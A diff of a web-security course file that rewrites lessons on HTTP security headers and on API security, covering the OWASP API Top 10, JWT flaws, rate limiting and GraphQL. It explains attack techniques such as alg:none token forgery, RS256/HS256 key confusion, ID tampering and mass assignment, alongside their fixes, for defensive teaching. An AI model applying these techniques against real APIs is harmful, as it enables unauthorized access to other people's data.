+  11: `<p>HTTP security headers are among the highest-value security improvements available to web developers. A few header lines in your server configuration or application middleware can mitigate entire vulnerability categories — clickjacking, MIME confusion attacks, protocol downgrade attacks, and sensitive data leakage — at essentially zero performance cost. Yet many production applications leave these headers unconfigured. Tools like <a href="https://securityheaders.com">securityheaders.com</a> and <a href="https://observatory.mozilla.org">Mozilla Observatory</a> score your headers instantly — aim for at least a B grade before launching any production application.</p>
+<p>Understanding not just <em>what</em> each header does but <em>why</em> is essential. Each header was created in response to a real attack vector that browsers could not defend against any other way.</p>
+
+<h5 class="content-heading">Content Security Policy (CSP) — The Most Powerful Header</h5>
+<p><strong>Content-Security-Policy</strong> instructs the browser about which sources of content are trusted for your page. Any content not matching the policy — inline scripts, scripts from unauthorised domains, eval() calls — is blocked before execution. CSP is the primary browser-side defence against XSS: even if an attacker successfully injects a <code>&lt;script&gt;</code> tag, CSP prevents it from executing.</p>
+<p>Key CSP directives:</p>
+<ul class="content-list">
+<li><strong>default-src 'self':</strong> The fallback policy for any resource type not explicitly specified — <code>'self'</code> means only your own origin.</li>
+<li><strong>script-src:</strong> Controls JavaScript sources. <code>'nonce-RANDOM'</code> allows only scripts with the matching nonce attribute. <code>'strict-dynamic'</code> (with a nonce) allows scripts loaded by trusted scripts, enabling modern SPAs without whitelisting every CDN.</li>
+<li><strong>style-src:</strong> Controls CSS sources. Be careful with <code>'unsafe-inline'</code> — inline styles can be used for data exfiltration via CSS injection attacks.</li>
+<li><strong>img-src:</strong> Controls image sources. Restricting this prevents attackers from using your site to make outbound requests via <code>&lt;img&gt;</code> tags.</li>
+<li><strong>connect-src:</strong> Controls which origins fetch(), XHR, and WebSocket can connect to — prevents data exfiltration to attacker servers.</li>
+<li><strong>frame-ancestors 'none':</strong> Modern replacement for X-Frame-Options — prevents your page from being framed.</li>
+<li><strong>report-uri / report-to:</strong> Sends CSP violation reports to a logging endpoint — essential for monitoring and policy tuning.</li>
+</ul>
+<p>Starting CSP: use <code>Content-Security-Policy-Report-Only</code> with a <code>report-uri</code> to log violations without blocking anything. Analyse the reports for 1-2 weeks to understand your application's actual content sources. Then switch to enforcement mode. A strict nonce-based CSP from Google's security team looks like: <code>script-src 'nonce-{RANDOM}' 'strict-dynamic' https:; object-src 'none'; base-uri 'none';</code></p>
+
+<h5 class="content-heading">HSTS — HTTP Strict Transport Security</h5>
+<p><strong>Strict-Transport-Security: max-age=31536000; includeSubDomains; preload</strong></p>
+<p>HSTS tells browsers to only connect to your site via HTTPS, never HTTP — even if the user types <code>http://</code> in the address bar. The <code>max-age</code> is in seconds (31536000 = 1 year). After the first HTTPS visit, the browser enforces HTTPS internally for the specified period, without even sending a request to your server — this eliminates SSL stripping attacks.</p>
+<p><code>includeSubDomains</code> applies the policy to all subdomains. <code>preload</code> opts your domain into browser vendors' HSTS preload lists — Chrome, Firefox, and Safari ship with a list of domains that must always use HTTPS, covering even first visits. Submit your domain at <a href="https://hstspreload.org">hstspreload.org</a>. Once submitted and propagated, your site cannot be reached over HTTP on any browser — this is permanent, so ensure all subdomains support HTTPS before preloading.</p>
+<p>Without HSTS, an SSL stripping attack on an unsecured network can intercept the first HTTP request (before the HTTPS redirect) and proxy the connection in cleartext — the user never sees a warning.</p>
+
+<h5 class="content-heading">X-Frame-Options and Clickjacking Prevention</h5>
+<p><strong>X-Frame-Options: DENY</strong> prevents your page from being loaded in any iframe — blocking clickjacking attacks entirely. <strong>SAMEORIGIN</strong> allows iframing only by your own domain. The CSP <code>frame-ancestors</code> directive is the modern equivalent with finer-grained control (supports specific domain allowlists), but X-Frame-Options is still needed for older browsers.</p>
+
+<h5 class="content-heading">X-Content-Type-Options: nosniff</h5>
+<p>Browsers historically tried to "sniff" the content type of a response if the <code>Content-Type</code> header was missing or incorrect — a feature designed to help render malformed responses. Attackers exploited this: upload a polyglot file (e.g. an image that is also valid JavaScript), serve it with <code>Content-Type: image/jpeg</code>, but if the browser sniffs it as JavaScript and executes it, XSS occurs. The <code>nosniff</code> directive tells the browser to respect the declared MIME type exactly and never guess. Always include this header.</p>
+
+<h5 class="content-heading">Referrer-Policy</h5>
+<p>When a user clicks a link on your page, the browser sends a <code>Referer</code> header to the destination containing your page's URL. If your URL contains sensitive parameters (session tokens, password reset tokens, user IDs), this header leaks them to third parties. Recommended: <code>Referrer-Policy: strict-origin-when-cross-origin</code> — sends the full URL for same-origin requests (useful for analytics) but only the origin (no path/query) for cross-origin requests.</p>
+
+<h5 class="content-heading">Permissions-Policy (formerly Feature-Policy)</h5>
+<p><strong>Permissions-Policy</strong> controls which browser features your page can use — and which are blocked. This prevents malicious iframes or injected scripts from accessing sensitive browser APIs: <code>Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()</code> disables camera, microphone, geolocation, and payment APIs for your entire page including any iframes it loads. A principle of least privilege for browser features.</p>
+
+<h5 class="content-heading">Hiding Server Information</h5>
+<p>Every bit of information about your server technology helps an attacker target known vulnerabilities. Remove or falsify these headers: <strong>Server</strong> (reveals "nginx/1.18.0", "Apache/2.4.51"), <strong>X-Powered-By</strong> (reveals "PHP/8.1.0", "Express"). In Express: <code>app.disable('x-powered-by')</code> or use the <code>helmet</code> middleware. In nginx: <code>server_tokens off;</code>. These are trivial to configure and reduce attacker reconnaissance.</p>
+
+<h5 class="content-heading">Quick Implementation with Helmet.js</h5>
+<p>For Node.js/Express applications, the <code>helmet</code> package sets 15+ security headers in one line: <code>app.use(helmet())</code>. It enables HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, and more with secure defaults. You can customise individual headers: <code>helmet.contentSecurityPolicy({ directives: { ... } })</code>. Every Express application should use helmet as a baseline — add it before any routes are defined.</p>
+
 <h5 class="content-heading">Key Concepts</h5>
 <ul class="content-list">
-<li><strong>X-Frame-Options: DENY:</strong> Prevents your page from being embedded in an iframe — stops clickjacking.</li>
-<li><strong>HSTS:</strong> Forces all future connections to use HTTPS for a defined period (max-age).</li>
-<li><strong>X-Content-Type-Options: nosniff:</strong> Prevents browsers from guessing a response's MIME type.</li>
-<li><strong>Referrer-Policy:</strong> Controls how much URL information is sent when navigating away from your site.</li>
+<li><strong>Content-Security-Policy:</strong> Instructs browsers which content sources are trusted — blocks XSS payload execution even after successful injection.</li>
+<li><strong>CSP nonce:</strong> Cryptographically random per-request value in both the header and legitimate script tags — allows those scripts while blocking all others.</li>
+<li><strong>report-only mode:</strong> CSP header variant that logs but does not block violations — use during policy development to avoid breaking your app.</li>
+<li><strong>HSTS:</strong> Forces HTTPS for the max-age period — browser enforces HTTPS locally, eliminating SSL stripping attacks and redirect interception.</li>
+<li><strong>HSTS preload:</strong> Opt-in list built into browsers ensuring your domain is HTTPS-only even on first visits — permanent and irreversible until removed from the list.</li>
+<li><strong>X-Frame-Options:</strong> Prevents your page from being framed — blocks clickjacking. DENY blocks all; SAMEORIGIN allows same-origin iframes.</li>
+<li><strong>X-Content-Type-Options: nosniff:</strong> Prevents MIME sniffing — browser uses only the declared Content-Type, never guesses.</li>
+<li><strong>Referrer-Policy:</strong> Controls how much URL information is leaked to external sites via the Referer header — protects sensitive URL parameters.</li>
+<li><strong>Permissions-Policy:</strong> Restricts which browser APIs (camera, microphone, geolocation) the page and its iframes can access — principle of least privilege for browser features.</li>
+<li><strong>Helmet.js:</strong> Node.js middleware that sets 15+ security headers with secure defaults in a single line — baseline for all Express applications.</li>
+<li><strong>SSL stripping:</strong> MITM attack that downgrades HTTPS to HTTP by intercepting the first HTTP request before the HTTPS redirect — prevented by HSTS.</li>
+<li><strong>Server information disclosure:</strong> Server and X-Powered-By headers revealing stack details — remove to reduce attacker reconnaissance.</li>
 </ul>`,
 
-  12: `<p>REST APIs are frequent attack targets because they are often publicly accessible and handle sensitive data. Common API vulnerabilities include broken object-level authorisation (accessing other users' data by changing an ID), missing rate limiting (brute-force and enumeration), and verbose error messages that reveal internal details to attackers.</p>
-<p>Integrating security into the Software Development Lifecycle (SDLC) means threat modelling during design, static analysis during development, code review before merge, and penetration testing before release. Security is not a phase — it is a practice applied continuously at every stage of development.</p>
+  12: `<p>APIs are the attack surface of the modern web. As applications shift to SPAs, mobile apps, and microservices, the entire security boundary moves to the API layer. The OWASP API Security Top 10 (2023 edition) addresses vulnerabilities unique to or more prevalent in API contexts — most of which differ meaningfully from the standard OWASP Top 10 because APIs operate without the natural friction of traditional web forms and browser-enforced boundaries.</p>
+<p>A single poorly secured API endpoint can expose the entire data model of an application. The 2019 Facebook API vulnerability exposed 540 million user records. The 2020 Venmo API allowed enumeration of all public transactions — researchers used it to identify business relationships, drug purchases, and political donations. The 2023 T-Mobile API breach exposed 37 million accounts. API security is not optional.</p>
+
+<h5 class="content-heading">OWASP API Top 10 — The Critical Risks</h5>
+<p><strong>API1 — Broken Object Level Authorization (BOLA)</strong>: The most prevalent API vulnerability. The server exposes object references (IDs) but fails to verify the requesting user owns or has permission to access that object. Example: <code>GET /api/orders/1234</code> — if changing 1234 to any other ID returns that order regardless of ownership, every order in your database is exposed. Fix: always verify ownership server-side on every request; never trust the client to enforce access control.</p>
+<p><strong>API2 — Broken Authentication</strong>: Weak API keys, no token expiry, sensitive tokens in URLs (appear in server logs and browser history), missing brute-force protection on authentication endpoints. JWTs accepted without signature verification. Fix: use short-lived tokens (15 minutes for access tokens), enforce HTTPS-only token transmission, implement rate limiting on authentication endpoints.</p>
+<p><strong>API3 — Broken Object Property Level Authorization</strong>: The API exposes more data than needed. A <code>GET /users/123</code> endpoint returns the full user object including password hash, internal flags, admin notes — fields the client should never see. Mass assignment: a <code>PUT /users/123</code> endpoint that updates any provided field, including <code>isAdmin: true</code>. Fix: explicitly specify which fields are included in each response; use allowlists for updateable fields, never blocklists.</p>
+<p><strong>API4 — Unrestricted Resource Consumption</strong>: No rate limiting on expensive operations — file uploads, image processing, email sending, payment processing. An attacker can exhaust your infrastructure by spamming expensive endpoints. Fix: rate limit at multiple levels (IP, user, endpoint), set file size and payload limits, implement request queuing for expensive operations.</p>
+<p><strong>API5 — Broken Function Level Authorization</strong>: Admin functions exposed but not properly secured — e.g. <code>DELETE /api/users/:id</code> accessible to regular users if they know the endpoint exists. Common in APIs that handle multiple user roles. Fix: enforce role-based access control on every endpoint; never rely on obscurity of the endpoint URL as security.</p>
+
+<h5 class="content-heading">JWT Security — A Deep Dive</h5>
+<p>JSON Web Tokens are the dominant stateless authentication mechanism for APIs, but they have several critical implementation pitfalls that have led to major breaches:</p>
+<p><strong>The alg:none attack</strong>: The JWT header specifies the signature algorithm. If a library accepts <code>"alg": "none"</code>, an attacker can craft a token without a signature — bypassing verification entirely. The payload is just base64-encoded, not encrypted, so the attacker can set <code>"role": "admin"</code>. Fix: explicitly specify which algorithms you accept; reject tokens with <code>alg:none</code>. In Node.js: <code>jwt.verify(token, secret, { algorithms: ['HS256'] })</code>.</p>
+<p><strong>RS256/HS256 confusion attack</strong>: If the server normally uses RS256 (asymmetric — signs with private key, verifies with public key), but the library also accepts HS256, an attacker can take the server's public key (which is public), sign a forged token with it using HS256, and present it. The library verifies it as valid because it uses the public key as the HMAC secret. Fix: explicitly whitelist only the algorithms your server uses.</p>
+<p><strong>Weak secrets</strong>: HS256 is only as secure as the secret key. Secrets like "secret", "password", or any dictionary word are brute-forceable offline once an attacker has captured a token. JWT secrets should be generated as 256+ bit random values: <code>node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"</code>.</p>
+<p><strong>No expiry or rotation</strong>: A JWT without an <code>exp</code> claim is valid forever — if leaked (from a log, a URL, a compromised device), it provides permanent access. JWTs should have short expiry times (15-60 minutes for access tokens, 7-30 days for refresh tokens). Implement refresh token rotation: each use of a refresh token issues a new one and invalidates the old — if a leaked token is used after rotation, the server detects reuse and can invalidate all sessions.</p>
+<p><strong>Storing JWTs in localStorage</strong>: localStorage is accessible by any JavaScript on the page — including XSS payloads. If your site has any XSS vulnerability, stored JWTs are immediately exfiltrated. Store access tokens in memory (JavaScript variable) and refresh tokens in HttpOnly cookies (JavaScript cannot read these). This is the recommendation from OAuth 2.0 Security Best Current Practice (RFC 9700).</p>
+
+<h5 class="content-heading">Rate Limiting and Abuse Prevention</h5>
+<p>Rate limiting is essential for APIs. Without it, attackers can: brute-force passwords (millions of attempts per second), enumerate valid email addresses (check which addresses exist), scrape your entire database, and conduct denial of service attacks. Implement rate limiting at multiple layers:</p>
+<ul class="content-list">
+<li><strong>IP-based rate limiting:</strong> Limit requests per IP address per time window. Useful but bypassable with distributed botnet IPs.</li>
+<li><strong>User-based rate limiting:</strong> Limit authenticated requests per user. Prevents authenticated abuse even from distributed IPs.</li>
+<li><strong>Endpoint-specific limits:</strong> Login endpoints: 5 attempts per 15 minutes. Password reset: 3 per hour. General API: 1000 per hour. Set limits based on legitimate use patterns.</li>
+<li><strong>Exponential backoff:</strong> After failed auth attempts, increase the wait time exponentially (1s, 2s, 4s, 8s...). Makes brute-force attacks impractical even within IP limits.</li>
+</ul>
+
+<h5 class="content-heading">GraphQL-Specific Security</h5>
+<p>GraphQL APIs have unique security considerations. Unlike REST, a single GraphQL endpoint accepts queries of arbitrary complexity — an attacker can craft deeply nested queries that join across multiple relationships and require exponential database queries to resolve: <code>{ users { friends { friends { friends { posts { comments { ... } } } } } } }</code>. Fix: implement query depth limiting, query complexity analysis (assign a cost to each field), and request timeout. Disable introspection in production — introspection allows anyone to query your entire schema, making API enumeration trivial.</p>
+
+<h5 class="content-heading">API Key Management</h5>
+<p>If your API uses API keys rather than JWTs: generate keys as 256-bit random values. Never log them in full — log only the first 8 characters for reference. Store them hashed (bcrypt or SHA-256) — if your key database is compromised, the actual keys are not revealed. Scope keys to specific operations (read-only keys vs write keys). Provide a key rotation mechanism and document it. Set expiry dates on keys. The 2022 Twilio breach was enabled by an SMS phishing attack that captured employee credentials — API keys in plaintext in a configuration file on the compromised machine allowed the attacker lateral movement to customer data.</p>
+
 <h5 class="content-heading">Key Concepts</h5>
 <ul class="content-list">
-<li><strong>BOLA (Broken Object Level Auth):</strong> Failing to verify the requester owns the resource they are accessing.</li>
-<li><strong>Rate limiting:</strong> Restricting how many requests a client can make in a time window.</li>
-<li><strong>JWT pitfalls:</strong> Never use <code>alg: none</code>; always verify the signature; keep tokens short-lived.</li>
-<li><strong>Penetration testing:</strong> Authorised simulated attacks to find vulnerabilities before real attackers do.</li>
+<li><strong>BOLA (Broken Object Level Authorization):</strong> Failing to verify the requester owns the resource they are accessing by ID — the #1 API vulnerability.</li>
+<li><strong>Mass assignment:</strong> API endpoint that updates any provided field without an allowlist — allows attackers to set privileged fields like isAdmin.</li>
+<li><strong>JWT (JSON Web Token):</strong> Stateless bearer token for API authentication — consists of header, payload, and signature, all base64-encoded.</li>
+<li><strong>alg:none attack:</strong> JWT vulnerability where accepting the "none" algorithm allows unsigned tokens — always explicitly whitelist allowed algorithms.</li>
+<li><strong>RS256/HS256 confusion:</strong> JWT attack exploiting algorithm flexibility — serve tokens with a consistent single algorithm and reject all others.</li>
+<li><strong>Refresh token rotation:</strong> Each use of a refresh token issues a new one and invalidates the old — enables detection of token theft.</li>
+<li><strong>Rate limiting:</strong> Restricting request volume per client/endpoint/time window — prevents brute force, enumeration, and resource exhaustion attacks.</li>
+<li><strong>GraphQL depth limiting:</strong> Restricting query nesting depth — prevents exponential query complexity attacks unique to GraphQL APIs.</li>
+<li><strong>API key scoping:</strong> Restricting API keys to only the operations they need — limits blast radius of compromised keys.</li>
+<li><strong>Penetration testing:</strong> Authorised simulated attacks to find vulnerabilities before real attackers do — required before production launch of any security-sensitive API.</li>
+<li><strong>Introspection:</strong> GraphQL feature allowing clients to query the full schema — disable in production to prevent API enumeration.</li>
+<li><strong>Secure SDLC:</strong> Integrating security at every phase — threat modelling in design, SAST in development, code review pre-merge, pen testing pre-release.</li>
 </ul>`,
 
   // ── Course 3: Advanced SQL & Databases ───────────────────────────────
